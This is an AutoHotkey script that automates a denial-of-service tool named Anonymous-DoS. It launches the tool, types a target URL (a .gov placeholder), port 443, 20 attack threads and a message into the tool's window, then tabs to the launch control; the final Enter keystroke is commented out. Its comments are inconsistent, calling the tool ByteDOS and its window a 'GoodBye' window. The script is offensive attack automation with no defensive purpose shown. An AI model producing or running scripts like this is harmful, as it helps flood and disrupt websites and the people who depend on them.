#CommentFlag //

// ------------------------------------------------
// CONFIG
// ------------------------------------------------

anonymousdos_path = C:\DoStools\Anonymous-DoS\Anonymous-DoS.hta
target_url = http://www.example.gov
target_port = 443	
attack_threads = 20
attack_message = ANONYMOUSDOS_AUTOHOTKEY_TEST

// ------------------------------------------------
// MAIN SCRIPT
// ------------------------------------------------

// Execute ByteDOS
Run, %anonymousdos_path%

// Give focus to GoodBye window
WinActivate, Anonymous-DoS
WinWaitActive, Anonymous-DoS

// Target URL
Send {TAB}
SendInput, %target_url%

// Attack threads
Send {TAB}
Send {TAB}
Send {TAB}
SendInput, %attack_threads%

// Attack message
Send {TAB}
SendInput, %attack_message%

// Execute attack
Send {TAB}
Send {TAB}
Send {TAB}
//Send {Enter}